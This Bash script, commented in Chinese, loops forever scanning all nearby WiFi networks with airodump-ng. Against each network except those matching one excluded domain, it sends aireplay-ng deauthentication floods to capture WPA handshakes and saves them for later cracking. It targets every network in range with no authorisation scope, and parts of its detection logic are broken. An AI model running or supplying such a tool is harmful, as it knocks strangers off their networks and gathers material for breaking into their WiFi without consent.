#!/bin/bash

# 使用 airodump-ng 扫描无线网络并保存到文件
# 保存的文件名格式为 wifi_list_YYYYMMDD_HHMM.csv

# 每次执行一次扫描和抓包后，重头再来
while true; do
  # 获取当前时间
  TIMESTAMP=$(date +"%Y%m%d_%H%M")
  
  mkdir -p wifi
  cd wifi
  rm -rf *
  
  # 创建存放握手包的目录
  HANDSHAKE_DIR="../handshakes"
  mkdir -p $HANDSHAKE_DIR
  
  # 输出文件名
  OUTPUT_FILE="wifi_list_${TIMESTAMP}.csv"
  
  # 检查是否有 root 权限
  if [ "$EUID" -ne 0 ]; then
    echo "请以 root 权限运行此脚本。"
    exit 1
  fi
  
  # 扫描 WiFi 并保存结果
  echo "正在扫描 WiFi 网络，请稍等..."
  airodump-ng wlan0mon -w wifi_list --output-format csv &
  
  # 运行 airodump-ng 一段时间（例如 10 秒）
  SLEEP_DURATION=10
  sleep $SLEEP_DURATION
  
  # 终止 airodump-ng
  AIRODUMP_PID=$(pgrep -f "airodump-ng wlan0mon")
  kill $AIRODUMP_PID
  
  # 将结果重命名为带有时间戳的文件
  mv wifi_list-01.csv "$OUTPUT_FILE"
  
  # 输出结果文件名
  echo "WiFi 列表已保存到文件: $OUTPUT_FILE"
  
  # 读取 WiFi 列表并提取 BSSID 和频道信息，去掉 ESSID 为空的行（隐藏网络）
  BSSIDS=($(awk -F',' 'NR>1 && $1 ~ /[0-9A-Fa-f:]{17}/ && $14 != "" && $14 !~ /ireoo\.com/ {print $1}' "$OUTPUT_FILE" | tr -d '\r' | tr -s ' '))
  CHANNELS=($(awk -F',' 'NR>1 && $1 ~ /[0-9A-Fa-f:]{17}/ && $14 != "" && $14 !~ /ireoo\.com/ {print $4}' "$OUTPUT_FILE" | tr -d '\r' | tr -s ' '))
  ESSIDS=($(awk -F',' 'NR>1 && $1 ~ /[0-9A-Fa-f:]{17}/ && $14 != "" && $14 !~ /ireoo\.com/ {print $14}' "$OUTPUT_FILE" | tr -d '\r' | tr -s ' '))
  
  # 循环获取握手包
  for ((i=0; i<${#BSSIDS[@]}; i++)); do
    BSSID=${BSSIDS[$i]}
    CHANNEL=${CHANNELS[$i]}
    ESSID=${ESSIDS[$i]}
    echo "正在获取 $ESSID[$BSSID] 的握手包，频道 $CHANNEL..."
  
    # 启动 airodump-ng，并通过管道将输出传递给 grep 进行实时查找
    airodump-ng -c $CHANNEL --bssid $BSSID -w $ESSID wlan0mon | grep -m 1 "WPA handshake" &
  
    # 获取后台进程的 PID
    AIRODUMP_PID=$!
  
    # 变量控制是否找到握手包
    FOUND_HANDSHAKE=false
  
    # 定义最大时间限制 10 分钟（600 秒）
    MAX_WAIT_TIME=600
    ELAPSED_TIME=0
  
    echo "发送去认证请求..."
    aireplay-ng -0 10 -a $BSSID wlan0mon &
    AIREPLAY_PID=$!
  
    # 使用 while 循环监控 airodump-ng 进程，检查是否找到握手包
    while ps -p $AIRODUMP_PID > /dev/null; do
      # 如果 grep 找到了 "WPA handshake"（退出状态为 0），表示找到握手包
      GREP_EXIT_STATUS=${PIPESTATUS[1]}  # 获取 grep 的退出状态
      if [ $GREP_EXIT_STATUS -eq 0 ]; then
        echo "找到 WPA 握手包，继续处理..."
        FOUND_HANDSHAKE=true
        break
      fi
  
      # 如果没有找到握手包，则每 5 秒发送一次 aireplay-ng 去认证请求
      if [ $ELAPSED_TIME -lt $MAX_WAIT_TIME ]; then
        # 累计时间
        ELAPSED_TIME=$((ELAPSED_TIME + 5))
      else
        echo "已执行 10 分钟，停止发送去认证请求。"
        break
      fi

      echo "已经执行：$ELAPSED_TIME 秒."
      # 每 5 秒休眠一次
      sleep 5
    done
  
    kill $AIREPLAY_PID
  
    # 如果找到握手包，则保存并退出
    if [ "$FOUND_HANDSHAKE" = true ]; then
      # 复制握手包到指定目录
      cp -rf $ESSID-*.cap $HANDSHAKE_DIR/
    else
      echo "没有找到 WPA 握手包，或者发生了错误。"
    fi
  done
  
  
  echo "所有 BSSID 的握手包获取和破解过程已完成。"

  # 完成后返回到顶部继续下一个循环
  echo "即将开始新的扫描和捕获过程..."
  # 等待一段时间后再次开始新的扫描
  sleep 5
done
